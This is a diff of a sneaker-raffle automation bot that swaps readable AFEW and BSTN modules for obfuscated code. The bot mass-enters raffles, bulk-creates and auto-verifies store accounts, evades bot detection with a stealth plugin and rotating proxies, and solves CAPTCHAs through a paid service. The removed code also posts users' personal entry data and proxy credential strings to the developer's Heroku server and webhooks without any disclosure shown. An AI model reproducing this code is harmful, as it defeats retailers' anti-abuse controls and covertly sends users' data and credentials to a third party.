-                                    headers: {
-                                        'Connection': 'keep-alive',
-                                        'Pragma': 'no-cache',
-                                        'Cache-Control': 'no-cache',
-                                        'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
-                                        'sec-ch-ua-mobile': '?0',
-                                        'DNT': '1',
-                                        'Upgrade-Insecure-Requests': '1',
-                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
-                                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                                        'cookies': '',
-                                        'Sec-Fetch-Site': 'none',
-                                        'Sec-Fetch-Mode': 'navigate',
-                                        'Sec-Fetch-User': '?1',
-                                        'Sec-Fetch-Dest': 'document',
-                                        'Accept-Language': 'en-US,en;q=0.9'
-                                    },
-                                    proxy: `http://${proxySplit[2]}:${proxySplit[3]}@${proxySplit[0]}:${proxySplit[1]}`,
-                                }
-                                let raffleLink = url.replace("de.afew-store.com", "en.afew-store.com").replace("en.afew-store.com", "raffles.afew-store.com");
-                                let jsonLink = raffleLink + '.json'
-                                // console.log(sizes);
-
-                                let GetResp = await axios(jsonLink);
-                                // console.log(GetResp)
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Variants`);
-
-
-                                let sizeObject = GetResp.data.product.variants;
-                                if (EU != 'RANDOM') {
-
-                                    if (sizeObject[1].option1.includes('W')) {
-                                        const size = sizes.women.find(s => s.EUsize === EU);
-                                        if (size) {
-                                            EU = size.size
-                                        }
-
-                                    }
-                                    else if (sizeObject[1].option1.includes('Y')) {
-                                        const size = sizes.GS.find(s => s.EUsize === EU);
-                                        if (size) {
-                                            EU = size.size
-                                        }
-
-                                    }
-                                    else {
-                                        const size = sizes.men.find(s => s.EUsize === EU);
-                                        if (size) {
-                                            EU = size.size
-                                        }
-                                    }
-                                    for (var size of sizeObject) {
-                                        if (size.option1 == EU) {
-                                            variant = size.id;
-                                        }
-                                    }
-                                } else {
-                                    var randomSize = Math.round(Math.random() * (sizeObject.length - 1));
-                                    variant = sizeObject[randomSize].id;
-
-                                }
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Adding to Cart`);
-
-
-                                addToCart = await axios(`https://raffles.afew-store.com/cart/${variant}:1`);
-                                // console.log(addToCart.request.res.responseUrl);
-                                PID_Link = addToCart.request.res.responseUrl
-
-
-                            }
-                            try {
-
-                                await checkVariant();
-                            } catch (e) {
-                                if (e.message.includes('TUNN')) {
-                                    throw new Error('Proxy Connection Error')
-
-                                }
-                                throw new Error(`Proxy Error: ${e}`)
-                            }
-                            const page = await browser.newPage();
-                            await page.setDefaultNavigationTimeout(120000);
-                            await page.authenticate({
-                                username: `${proxySplit[2]}`,
-                                password: `${proxySplit[3]}`,
-                            });
-                            // console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                            await page.setRequestInterception(true);
-                            page.on("request", (req) => {
-                                if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                    req.abort();
-                                } else {
-                                    req.continue();
-                                }
-                            });
-                            // console.log(PID_Link)
-                            try {
-                                await page.goto(PID_Link, { waituntil: 'networkidle0' });
-
-                            } catch {
-                                throw new Error('Connection Error')
-                            }
-                            // await delay(7000)
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Submitting Information`);
-                            try {
-                                await page.waitForSelector('#checkout_email');
-
-                            } catch {
-                                throw new Error('Proxy Error')
-                            }
-
-                            await page.type('#checkout_email', `${afew[i].Email}`);
-                            await delay(800);
-                            await page.type('#checkout_attributes_instagram', `${afew[i].Follower}`);
-                            await delay(800);
-                            await page.select('#checkout_shipping_address_country', `${afew[i].Country}`);
-                            await page.waitForTimeout(600);
-                            await page.type("#checkout_shipping_address_first_name", `${afew[i].FirstName}`);
-                            await page.waitForTimeout(800);
-                            await page.type("#checkout_shipping_address_last_name", `${afew[i].LastName}`);
-                            await page.waitForTimeout(700);
-                            await page.type("#checkout_shipping_address_address1", `${afew[i].Address1} ${afew[i].HouseNumber}`);
-                            await page.waitForTimeout(700);
-                            await page.type("#checkout_shipping_address_address2", `${afew[i].Address2}`);
-                            await page.waitForTimeout(700);
-
-                            await page.type("#checkout_shipping_address_zip", `${afew[i].Zip}`)
-
-                            await page.waitForTimeout(700);
-                            await page.type("#checkout_shipping_address_city", `${afew[i].City}`);
-                            await page.waitForTimeout(700);
-                            if (afew[i].State != "") {
-                                try {
-
-                                    const states = JSON.parse(fs.readFileSync('States.json', 'utf8'))
-                                    // console.log(states.length);
-                                    await delay(500)
-                                    // var x;
-                                    // let stateSplit = afew[i].State.split(' ')[0]
-                                    // console.log(states)
-                                    if (afew[i].State.length > 2) {
-
-                                        for (let s of states) {
-
-
-                                            if (s.Province == afew[i].State) {
-                                                await page.select('#checkout_shipping_address_province', s.Code)
-
-                                                break;
-                                            }
-                                        }
-                                    } else {
-                                        await page.select('#checkout_shipping_address_province', afew[i].State.toUpperCase())
-                                    }
-                                } catch {
-
-                                }
-
-                            }
-                            await delay(500);
-                            // await page.keyboard.press('Enter');
-                            // const state = await page.$x(`//option[text()="${afew[i].State}"]`);
-                            // await state[0].click();
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Shipping`);
-                            await delay(400)
-                            page.evaluate(() => {
-                                const element = document.querySelector("#continue_button")
-                                for (var e = 0; e < 5; e++) {
-                                    if (element) {
-                                        element.click();
-                                        element.click();
-                                        break;
-                                    } else {
-                                        delay(4000)
-                                    }
-                                }
-                            });
-
-                            await page.waitForTimeout(2500);
-                            try {
-
-                                await page.waitForSelector('form[data-shipping-method-form="true"]');
-                                await page.$eval('form[data-shipping-method-form="true"]', f => f.submit())
-
-                            } catch {
-
-                                throw new Error('Proxy Error')
-                            }
-                            // page.evaluate(() => {
-                            //     const element = document.querySelector("#continue_button")
-                            //     for (var e = 0; e < 5; e++) {
-                            //         if (element) {
-                            //             element.click();
-                            //             break;
-                            //         } else {
-                            //             delay(4000)
-                            //         }
-                            //     }
-                            // });
-                            await page.waitForTimeout(2000);
-                            console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Finishing Entry`);
-                            try {
-
-                                await page.waitForSelector('div[data-payment-subform="required"]', { timeout: 100000 });
-
-                            } catch {
-                                throw new Error('Proxy Error')
-                            }
-                            await delay(1000);
-                            await page.$eval('body > div.content > div > div > main > div.step > div > form', f => f.submit())
-                            await delay(1000);
-                            try {
-
-                                await page.waitForSelector('div[data-last-step="true"]', { timeout: 100000 });
-
-                            } catch {
-                                throw new Error('Proxy Error')
-                            }
-                            await page.$eval('body > div.content > div > div > main > div.step > form', f => f.submit())
-                            // page.evaluate(() => {
-                            //     const element = document.querySelector("#continue_button")
-                            //     for (var e = 0; e < 5; e++) {
-                            //         if (element) {
-                            //             element.click();
-                            //             break;
-                            //         } else {
-                            //             delay(4000)
-                            //         }
-                            //     }
-                            // });
-                            // await page.waitForTimeout(2500);
-                            // await page.waitForSelector(".section.section--billing-address");
-                            // await page.evaluate(() => {
-                            //     const element = document.querySelector("#continue_button")
-                            //     for (var e = 0; e < 5; e++) {
-                            //         if (element) {
-                            //             element.click();
-                            //             break;
-                            //         } else {
-                            //             delay(4000)
-                            //         }
-                            //     }
-                            // });
-                            try {
-                                await page.waitForSelector(`div[data-step="thank_you"]`)
-                                retry = 'no';
-                                successfulLog(afew[i], currentFunction);
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Raffle Entered!`));
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    try {
-
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    } catch {
-
-                                    }
-                                }
-                                await delay(200);
-                                await sendWebhook(succesWH, EMBEDS.succesDEVMSG);
-                                await delay(200);
-                                try {
-
-                                    await sendWebhook(publicWH, EMBEDS.succesPUBMSG);
-                                } catch {
-
-                                }
-                                try {
-                                    prxdata = {
-                                        username: username.replace('#', ''),
-                                        module: currentFunction.name,
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-
-                                }
-                            } catch (e) {
-                                throw new Error('Connection Error Fetching Response')
-                            }
-
-                        } catch (e) {
-                            if (e.message.includes('selector')) {
-                                e = 'Connection Error'
-                            }
-                            console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                            ERROR = `${e}`;
-                            var errorDEV = await makeEmbed(afew[i], currentFunction, 'dev', true, ERROR);
-                            EMBEDS.errorDEV = { embeds: [errorDEV] }
-                            if (settings.webhook != undefined && settings.webhook != '') {
-                                await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                            }
-                            await sendWebhook(errorWH, EMBEDS.errorDEV);
-
-                            retry = 'yes';
-                        } finally {
-                            if (browser) {
-                                browser.close();
-
-                            }
-                            if (retry == 'yes' && t != 5 && ERROR != 'Size Not Found') {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-                                i = i - 1;
-                                t = t + 1;
-                                continue;
-                            }
-                            if (retry == 'yes' && t >= 5) {
-                                errorLog(afew[i], currentFunction)
-                                retry = 'no';
-                                t = 0;
-                            }
-                            if (i + 1 == afew.length) {
-                                await delay(2000);
+        'name': 'AFEW\x20Store',
+        'modules': [{
+            'name': 'AFEW\x20Raffle\x20Entries',
+            'store': 'AFEW',
+            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
+            'function': async function (_0xb02146, _0x585d00, _0x3263cc) {
+                for (var _0x486823 = 0x0; _0x486823 < _0x585d00['length']; _0x486823++) {
+                    _0x51d52a['AfewDelay'] = _0x51d52a['delay'];
+                    var _0x153d5e;
+                    if (_0x1c9b59 != 'yes')
+                        var _0x1c9b59 = '', _0x4870ec = 0x0;
+                    var _0x351550 = _0x585d00[_0x486823]['Url'], _0x46d92e = _0x585d00[_0x486823];
+                    _0x244762(_0xb02146['name'] + '\x20Task\x20' + (_0x486823 + 0x1) + '\x20/\x20' + _0x585d00['length'] + '\x20||\x20File:\x20' + _0x214f6f + '\x20Proxies:\x20' + _0x1d31f7);
+                    try {
+                        await _0x2c2316(_0x585d00, _0x486823);
+                    } catch {
+                        _0x1c9b59 = 'no';
+                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
+                    }
+                    async function _0x24a07c(_0x4d729e) {
+                        const _0x534c14 = _0x65e0bc['readFileSync']('../successful-tasks.csv', 'utf8'), _0x255a97 = _0x3e0e2d['parse'](_0x534c14, { 'header': !![] })['data'];
+                        let _0x2645d5 = ![];
+                        for (var _0x365417 of _0x255a97) {
+                            if (_0x365417['Url'] == _0x4d729e['Url'] && _0x365417['Email'] == _0x4d729e['Email']) {
+                                _0x2645d5 = !![];
                                 break;
                             }
-                            console.log(`Waiting for ${settings.AfewDelay} ms`);
-                            await delay(settings.AfewDelay);
                         }
+                        return _0x2645d5;
                     }
-                }
-            }
-        ]
-    },
-    {
-        name: 'BSTN',
-        modules: [
-            {
-                name: 'BSTN Account Generator',
-                store: 'BSTN',
-                logo: 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
-                function: async function (currentFunction, bstn, proxies) {
-                    var opium = bstn;
-                    var tasks = 0;
-                    for (var i = 0; i < bstn.length; i++) {
-                        maxTasks = Number(settings.threads);
-
-                        while (tasks >= maxTasks) {
-                            await delay(settings.delay);
-                            // console.log(`waiting`)
-                        }
-                        async function bstnFunction(currentFunction, bstn, proxies, i, t) {
-                            tasks++;
-                            puppeteer.use(StealthPlugin());
-                            puppeteer.use(RecaptchaPlugin({
-                                provider: {
-                                    id: '2captcha',
-                                    token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                                },
-                                visualFeedback: true
-                            }))
-
-
-                            var ERROR;
-                            try {
-                                await jig(bstn, i);
-
-                            } catch {
-                                retry = 'no';
-                                throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                            }
-                            setTitle(`${currentFunction.name} Task ${i + 1} / ${bstn.length} || File: ${currentFile} Proxies: ${currentProxy}`);
-
-                            var succesDEV = await makeEmbed(bstn[i], currentFunction, 'acc', false);
-
-
-                            const EMBEDS =
-                            {
-                                succesDEVMSG: { embeds: [succesDEV] }
-                            };
-                            const url = `https://www.bstn.com/eu_en/customer/account/create/`
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                            var browser
-                            try {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-
-                            } catch {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-                            }
-                            try {
-                                const page = await browser.newPage();
-                                await page.authenticate({
-                                    username: `${proxySplit[2]}`,
-                                    password: `${proxySplit[3]}`,
-                                });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                                await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                                await page.setRequestInterception(true);
-                                page.on("request", (req) => {
-                                    if (req.resourceType() === "image") {
-                                        req.abort();
-                                    } else {
-                                        req.continue();
-                                    }
-                                });
-                                try {
-                                    await page.goto(`${url}`);
-                                    await page.waitForSelector('button[class="cf2Lf6"]');
-
-                                } catch {
-                                    retry = 'yes'
-                                    throw new Error('Proxy Error')
-                                }
-                                await page.click('button[class="cf2Lf6"]');
-                                // await page.waitForSelector('a.action.create.primary.social-login');
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Passing Cloudflare`);
-                                // await delay(2000);
-                                // await page.click('a.action.create.primary.social-login');
-                                await delay(2000);
-                                // await page.click('button.button.dashboard-actions-toolbar__item');
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Checking Credentials`);
-                                await delay(400);
-                                await page.waitForSelector('#firstname')
-                                await page.focus('#firstname');
-                                await page.keyboard.down('Control');
-                                await page.keyboard.press('A');
-                                await delay(200);
-                                await page.keyboard.up('Control');
-                                await page.keyboard.press('Backspace');
-                                await page.type('#firstname', bstn[i].FirstName, { delay: 240 });
-                                await delay(400);
-                                await page.focus('#lastname');
-                                await page.keyboard.down('Control');
-                                await page.keyboard.press('A');
-                                await delay(200);
-                                await page.keyboard.up('Control');
-                                await page.keyboard.press('Backspace');
-                                await page.type('#lastname', bstn[i].LastName, { delay: 230 });
-                                await delay(400);
-                                await page.focus('#email_address');
-                                await page.keyboard.down('Control');
-                                await page.keyboard.press('A');
-                                await delay(200);
-                                await page.keyboard.up('Control');
-                                await page.keyboard.press('Backspace');
-                                await page.type('#email_address', bstn[i].Email, { delay: 290 });
-                                await delay(400);
-                                await page.type('#password', bstn[i].Password, { delay: 130 });
-                                await delay(500);
-                                await page.type('#password-confirmation', bstn[i].Password, { delay: 124 });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Sending Request`);
-                                await delay(700)
-                                await page.$eval('#form-validate', form => form.submit());
-                                // await page.click('#bt-social-create');
-                                // await page.click('#bt-social-create');
-                                await delay(5000);
-                                const mailError = await page.$('#email_address-error');
-                                if (mailError) {
-                                    throw new Error('Invalid Email');
-                                }
-                                const passwordError = await page.$('#password-error');
-                                if (passwordError) {
-                                    throw new Error('Invalid Password');
-                                }
-                                await page.waitForSelector('div.mesg-success');
-                                retry = 'no';
-
-                                console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Account ${bstn[i].Email} Generated`));
-                                fs.appendFileSync('../accounts/bstn.csv', `\n${bstn[i].Email},${bstn[i].Password}`);
-                                try {
-                                    if (settings.webhook != undefined && settings.webhook != '') {
-                                        await sendWebhook(settings.webhook, EMBEDS.succesDEVMSG);
-                                    }
-                                } catch {
-                                }
-                                await sendWebhook(accountWH, EMBEDS.succesDEVMSG);
-                                let task = bstn[i]
-                                try {
-                                    prxdata = {
-                                        username: username.replace('#', ''),
-                                        module: currentFunction.name,
-                                        entrydata: JSON.stringify(task),
-                                        proxy: `${proxies[i]}`
-                                    }
-                                    var prx = JSON.stringify(prxdata);
-                                    let config = {
-                                        headers: {
-                                            'content-type': 'application/json',
-                                        }
-                                    }
-                                    await axios.post('https://jraffles.herokuapp.com/success', prx, config)
-                                } catch (e) {
-
-                                }
-                                console.log(chalk.yellow(`${getTime()} [${currentFunction.name}] Task ${i + 1} : After your all tasks are finished, run 'BSTN Account Verifier'`));
-
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                                ERROR = `${e}`
-                                var errorDEV = await makeEmbed(bstn[i], currentFunction, 'acc', true, ERROR);
-                                EMBEDS.errorDEV = { embeds: [errorDEV] }
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEV);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEV);
-                                retry = 'yes';
-                            } finally {
-                                if (browser)
-                                    browser.close();
-                                if (retry == 'yes' && t != 5) {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t + 1} / 5)`));
-                                    tasks--;
-                                    t = t + 1;
-                                    return bstnFunction(currentFunction, bstn, proxies, i, t);
-                                }
-                                if (retry == 'yes' && t >= 5) {
-                                    errorLog(bstn[i], currentFunction)
-                                    retry = 'no';
-                                    t = 0;
-                                }
-                                tasks--;
-                                console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-                                await delay(settings.delay);
-                            }
-
-                        }
-                        bstnFunction(currentFunction, opium, proxies, i, 0);
-                        await delay(400);
+                    if (await _0x24a07c(_0x585d00[_0x486823]) == !![]) {
+                        console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
+                        continue;
                     }
-                }
-            },
-            {
-                name: 'BSTN Account Verifier',
-                store: 'BSTN',
-                logo: 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
-                function: async function (currentFunction, proxies) {
-                    var done = false
-                    var links = [];
-                    var tasks = 0;
-                    // console.log(`Found ${links.length} Links in Mailbox`)
-                    async function getMails() {
-                        var imap = new Imap({
-                            user: settings.masterMail,
-                            password: settings.masterPassword,
-                            host: 'imap.gmail.com',
-                            port: 993,
-                            tls: true,
-                            autotls: 'always'
-                        });
-
-                        function openInbox(cb) {
-                            imap.openBox('INBOX', false, cb);
-                        }
-
-                        imap.once('ready', function () {
-                            openInbox(function (err, box) {
-                                console.clear()
-                                console.log('Looking For Links')
-                                if (err) throw err;
-                                imap.seq.search(['UNSEEN', ['SUBJECT', 'Please confirm your BSTN Store account']], function (err, results) {
-                                    if (!results || !results.length) {
-                                        console.log(`${getTime()} [${currentFunction.name}] No mails found`);
-
-                                        imap.end();
-
-                                    } else {
-
-                                        var f = imap.seq.fetch(results, { bodies: '', markSeen: true });
-                                        f.on('message', function (msg, seqno) {
-                                            // console.log('Message #%d', seqno);
-                                            var prefix = '(#' + seqno + ') ';
-                                            msg.on('body', function (stream, info) {
-                                                simpleParser(stream, (err, mail) => {
-                                                    // console.log(mail.text)
-                                                    var bstnSplit = mail.text.split('customer/account/confirm/')[1];
-                                                    var bstnLink = bstnSplit.split(']')[0];
-                                                    // var msgSplit = mail.html.split('\n')
-                                                    links.push(`https://www.bstn.com/eu_en/customer/account/confirm/${bstnLink}`)
-                                                    // console.log(bstnLink)
-                                                    // for (var i = 0; i < msgSplit.length; i++) {
-                                                    //     if (msgSplit[i].includes('salesmanago') && msgSplit[i].includes('<td') && msgSplit[i].includes('href')) {
-                                                    //         var linklong = msgSplit[i].split('href="')
-                                                    //         var l = linklong[1].split('"')[0]
-                                                    //         links.push(l)
-                                                    //         break;
-                                                    //     }
-                                                    // }
-
-                                                    // console.log(mail.html.split('\n'));
-                                                    // mes = mail.text.split('[')[2]
-                                                    // link = mes.split(']')[0];
-                                                    // console.log(link);
-                                                });
-                                                // imap.seq.setFlags(seqno, 'SEEN')
-
-
-                                            });
-                                            // msg.once('attributes', function (attrs) {
-                                            //     console.log(prefix + 'Attributes: %s', inspect(attrs, false, 8));
-                                            // });
-                                            msg.once('end', function () {
-                                                // console.log(prefix + 'Finished');
-
-
-                                            });
-                                        });
-                                        f.once('error', function (err) {
-                                            console.log('Fetch error: ' + err);
-                                            done = true;
-                                        });
-                                        f.once('end', function () {
-                                            // console.log('Done fetching all messages!');
-                                            imap.end();
-                                            done = true;
-                                        });
-
-                                    }
-                                })
-                            });
-                        });
-
-
-
-                        imap.once('error', function (err) {
-                            console.log(chalk.red(err.message))
-                            console.log('Read the guide on how to setup your mailbox')
-                            done = true
-
-                        });
-
-                        imap.once('end', async function () {
-                            done = true;
-
-                            // console.log('Connection ended');
-                        });
-
-                        imap.connect();
+                    var _0x17a2bf = await _0x2520f4(_0x585d00[_0x486823], _0xb02146, 'dev', ![]), _0x5854d3 = await _0x2520f4(_0x585d00[_0x486823], _0xb02146, 'pub', ![]);
+                    const _0x241d3d = {
+                        'succesDEVMSG': { 'embeds': [_0x17a2bf] },
+                        'succesPUBMSG': { 'embeds': [_0x5854d3] }
+                    };
+                    if (_0x585d00[_0x486823]['Email'] == '' || _0x585d00[_0x486823]['FirstName'] == '' || _0x585d00[_0x486823]['LastName'] == '' || _0x585d00[_0x486823]['Country'] == '' || _0x585d00[_0x486823]['Size'] == '' || _0x585d00[_0x486823]['Address1'] == '' || _0x585d00[_0x486823]['Zip'] == '') {
+                        console['log'](_0x3982db() + '\x20[' + _0xb02146['name'] + ']\x20Task\x20' + (_0x486823 + 0x1) + '\x20:\x20Invalid\x20CSV');
+                        continue;
                     }
-
+                    if (_0x51d52a['useRandomProxy'] = ![])
+                        var _0x2fccad = _0x3263cc[_0x486823]['split'](':');
+                    else
+                        var _0x3746d2 = Math['round'](Math['random']() * (_0x3263cc['length'] - 0x1)), _0x2fccad = _0x3263cc[_0x3746d2]['split'](':');
+                    var _0x213ce9;
                     try {
-                        getMails();
-                        while (!done) {
-                            await delay(4000);
-                        }
-                        console.log(`Found ${links.length} Links in Mailbox`)
-
+                        _0x213ce9 = await _0x5d136d['launch']({
+                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                            'headless': !![],
+                            'args': [
+                                '--proxy-server=' + _0x2fccad[0x0] + ':' + _0x2fccad[0x1],
+                                '--no-sandbox',
+                                '--disable-setuid-sandbox'
+                            ]
+                        });
                     } catch {
-                        console.log(`Searching mailbox failed, please read the guide on how to setup..`)
-                        await delay(2000);
+                        _0x213ce9 = await _0x5d136d['launch']({
+                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
+                            'headless': !![],
+                            'args': [
+                                '--proxy-server=' + _0x2fccad[0x0] + ':' + _0x2fccad[0x1],
+                                '--no-sandbox',
+                                '--disable-setuid-sandbox'
+                            ]
+                        });
                     }
-                    for (var i = 0; i < links.length; i++) {
-                        maxTasks = Number(settings.threads);
-
-                        while (tasks >= maxTasks) {
-                            await delay(settings.delay);
-                            // console.log(`waiting`)
-                        }
-                        async function verify(currentFunction, links, proxies, i, t) {
-                            tasks++;
-                            puppeteer.use(StealthPlugin());
-
-                            if (retry != 'yes') {
-                                var retry = '';
-                                var t = 0;
-
-                            }
-                            var randomProxy = Math.round(Math.random() * (proxies.length - 1));
-                            var proxySplit = proxies[randomProxy].split(":");
-                            var browser
-                            try {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-
-                            } catch {
-                                browser = await puppeteer.launch({
-                                    executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
-                                    headless: true,
-                                    args: [`--proxy-server=${proxySplit[0]}:${proxySplit[1]}`, '--no-sandbox', '--disable-setuid-sandbox'],
-                                });
-                            }
-                            try {
-                                const page = await browser.newPage();
-                                await page.authenticate({
-                                    username: `${proxySplit[2]}`,
-                                    password: `${proxySplit[3]}`,
-                                });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Starting Verification`);
-                                await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36')
-                                await page.setRequestInterception(true);
-                                page.on("request", (req) => {
-                                    if (req.resourceType() === "image" || req.resourceType() === "font" || req.resourceType() === "media") {
-                                        req.abort();
-                                    } else {
-                                        req.continue();
-                                    }
-                                });
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Getting Session`);
-                                try {
-                                    await page.goto(links[i]);
-
-                                } catch (e) {
-                                    retry = 'yes'
-                                    throw new Error(`'Connection Error' ${e}`)
-                                }
-                                console.log(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Passing Cloudflare`);
-                                await page.waitForTimeout(3000);
-                                try {
-                                    await page.waitForSelector('.account-nav');
-                                    retry = 'no';
-
-                                    console.log(chalk.green(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Verification Successful`));
-                                    var succesDEV = await makeEmbed(null, currentFunction, 'ver', false);
-                                    const EMBEDS =
-                                    {
-                                        succesDEVMSG: { embeds: [succesDEV] }
-                                    };
-                                    await sendWebhook(verWH, EMBEDS.succesDEVMSG)
-                                } catch {
-                                    retry = 'no';
-                                    throw new Error('Link Already Verified, skipping..');
-                                }
-
-                            } catch (e) {
-                                console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : ${e}`));
-                                var ERROR = e
-                                var errorDEV = await makeEmbed(null, currentFunction, 'ver', true, ERROR);
-                                const EMBEDS =
-                                {
-                                    errorDEVMSG: { embeds: [errorDEV] }
-                                };
-                                if (settings.webhook != undefined && settings.webhook != '') {
-                                    await sendWebhook(settings.webhook, EMBEDS.errorDEVMSG);
-                                }
-                                await sendWebhook(errorWH, EMBEDS.errorDEVMSG);
-
-                            } finally {
-                                browser.close();
-                                if (retry == 'yes' && t != 5) {
-                                    console.log(chalk.red(`${getTime()} [${currentFunction.name}] Task ${i + 1} : Retrying (${t} / 5)`));
-
-                                    tasks--;
-                                    t = t + 1;
-                                    return verify(currentFunction, links, proxies, i, t);
-                                }
-                                if (retry == 'yes' && t >= 5) {
-                                    retry = 'no';
-                                    t = 0;
-                                }
-
-                                tasks--;
-                                console.log(`${getTime()} [${currentFunction.name}] Waiting for ${settings.delay} ms`);
-                                await delay(settings.delay);
-                            }
-
-                        }
-                        if (i == links.length - 1) {
-                            await verify(currentFunction, links, proxies, i, 0);
-                            return
-                        }
-                        verify(currentFunction, links, proxies, i, 0);
-                        await delay(300);
-                    }
-
-                }
-            },
-            {
-                name: 'BSTN Raffle Entries',
-                store: 'BSTN',
-                logo: 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
-                function: async function (currentFunction, bstn, proxies) {
-                    var tasks = 0;
-                    var opium = bstn;
-                    for (var i = 0; i < bstn.length; i++) {
-                        maxTasks = Number(settings.threads);
-
-                        while (tasks >= maxTasks) {
-                            await delay(settings.delay);
-                            // console.log(`waiting`)
-                        }
-                        let dupli = false
-                        async function bstnFunction(currentFunction, bstn, proxies, i, t) {
-                            tasks++;
-                            puppeteer.use(StealthPlugin());
-                            puppeteer.use(RecaptchaPlugin({
-                                provider: {
-                                    id: '2captcha',
-                                    token: `${settings.captchaKey}` // REPLACE THIS WITH YOUR OWN 2CAPTCHA API KEY ⚡
-                                },
-                                visualFeedback: true
-                            }))
-
-                            var ERROR;
-                            var task = bstn[i]
-                            try {
-                                await jig(bstn, i);
-
-                            } catch {
-                                retry = 'no';
-                                throw new Error('Invalid CSV Format, use the CSV Files from the guides!')
-                            }
-                            async function checkDuplicate(csv) {
-                                const successFile = fs.readFileSync('../successful-tasks.csv', 'utf8');
-                                const success = Papa.parse(successFile, { header: true }).data
-                                // console.log(success)
-                                let duplicate = false
-                                for (var task of success) {
-                                    if (task.Url == csv.Url && task.Email == csv.Email) {
-                                        duplicate = true;
-                                        break;
-                                    }
-                                }
-                                return duplicate;
-
-                            }
-
-
-                            // console.log(bstn[i]);
-                            setTitle(`${currentFunction.name} Task ${i + 1} / ${bstn.length} || File: ${currentFile} Proxies: ${currentProxy}`);
